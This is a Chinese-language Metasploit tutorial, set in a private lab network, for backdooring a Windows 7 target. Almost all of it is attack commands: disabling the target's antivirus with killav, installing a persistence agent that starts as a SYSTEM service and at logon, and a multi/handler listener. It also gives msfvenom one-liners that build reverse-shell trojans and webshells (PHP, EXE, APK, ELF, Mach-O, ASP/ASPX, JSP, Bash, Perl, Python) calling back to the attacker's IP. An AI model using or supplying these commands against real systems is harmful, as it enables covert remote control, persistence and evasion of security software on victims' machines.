### 攻击机与目标机配置
- **攻击机 IP**: 192.168.85.130
- **目标机 (Windows 7) IP**: 192.168.85.131

### 持久性后门创建

**注意事项**:
在执行以下操作前，请确保已关闭目标机上的杀毒软件。
```bash
run post/windows/manage/killav
```

**命令**:
```bash
run persistence -S -U -X -i 5 -p 6666 -r 192.168.85.130
```

**参数解释**:
- `-A`：自动启动一个匹配的漏洞/多/处理程序来连接到代理
- `-L`：如果不使用 `%TEMP%`，则选择目标主机中写入有效负载的位置
- `-P`：默认有效载荷为 `windows/meterpreter/reverse_tcp`
- `-S`：在启动时自动启动代理作为服务（具有系统特权）
- `-T`：选择要使用的可执行模板
- `-U`：用户登录时自动启动代理
- `-X`：在系统启动时自动启动代理
- `-h`：显示帮助菜单
- `-i`：每次连接尝试之间的间隔（以秒为单位）
- `-p`：运行 Metasploit 的系统正在监听的端口
- `-r`：运行 Metasploit 的系统的 IP 监听连接返回

**结果**:
- 在目标机 `C:\Windows\TEMP` 下会生成一个名为 `QeVoiKqW.vbs` 的文件。

**设置监听**:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.85.130
set lport 6666
run
```

此时，应能看到已经建立的连接，持久性后门创建成功。

### Meterpreter 后门创建

#### PHP Meterpreter
1. 使用 `msfvenom` 工具制作 PHP Meterpreter：
   ```bash
   msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f raw -o test.php
   ```
2. 将生成的 `test.php` 文件上传至目标服务器。
3. 设置监听：
   ```bash
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set lhost 192.168.85.130
   set lport 6666
   run
   ```
4. 访问上传后的 `test.php` 文件，即可看到已建立的连接，后门创建成功。

#### EXE Meterpreter
1. 创建 `test.exe` 文件：
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f exe > test.exe
   ```
2. 将 `test.exe` 通过各种方法放置于目标机并运行。
3. 设置监听：
   ```bash
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set lhost 192.168.85.130
   set lport 6666
   run
   ```

### 其他格式木马生成
- **Android App**:
  ```bash
  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666 -o ~/Desktop/test2.apk
  ```
- **Linux**:
  ```bash
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f elf > shell.elf
  ```
- **Mac**:
  ```bash
  msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f macho > shell.macho
  ```
- **ASP**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f asp > shell.asp
  ```
- **ASPX**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f aspx > shell.aspx
  ```
- **JSP**:
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f raw > shell.jsp
  ```
- **Bash**:
  ```bash
  msfvenom -p cmd/unix/reverse_bash LHOST=192.168.85.130 LPORT=6666 -f raw > shell.sh
  ```
- **Perl**:
  ```bash
  msfvenom -p cmd/unix/reverse_perl LHOST=192.168.85.130 LPORT=6666 -f raw > shell.pl
  ```
- **Python**:
  ```bash
  msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.85.130 LPORT=6666 -f raw > shell.py
  ```

### ASPX Meterpreter 后门
1. 调用模块：
   ```bash
   use windows/shell_reverse_tcp
   set lhost 192.168.85.130
   set lport 4444
   ```
2. 查看帮助信息：
   ```bash
   generate -h
   ```
3. 生成 ASPX 版本的 Shellcode：
   ```bash
   generate -t aspx
   ```
4. 保存生成的内容为 `test.aspx` 并上传到服务器。
5. 设置监听：
   ```bash
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set lhost 192.168.85.130
   set lport 6666
   run
   ```
6. 访问网站上的 `test.aspx` 文件，确认服务端反弹成功。